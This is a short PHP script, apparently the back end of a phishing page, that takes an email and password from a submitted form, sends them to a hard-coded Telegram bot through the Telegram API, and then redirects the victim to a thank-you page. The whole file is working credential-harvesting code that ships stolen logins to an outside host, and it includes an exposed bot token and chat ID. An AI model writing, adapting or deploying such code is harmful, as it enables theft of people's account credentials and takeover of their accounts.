<?php

$email = $_POST['email'];
$password = $_POST['password']; 
$token = "7424399552:AAEBzocbQM3LK6lMnFOWqmCqz4afpowsbzo";
$chat_id = "666831176";

$arr = array(
  'Email: ' => $email,
  'Пароль: ' => $password
);

$txt = "";
foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
}

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if ($sendToTelegram) {
  header('Location: thankful.php');
} else {
  echo "Error";
}

?>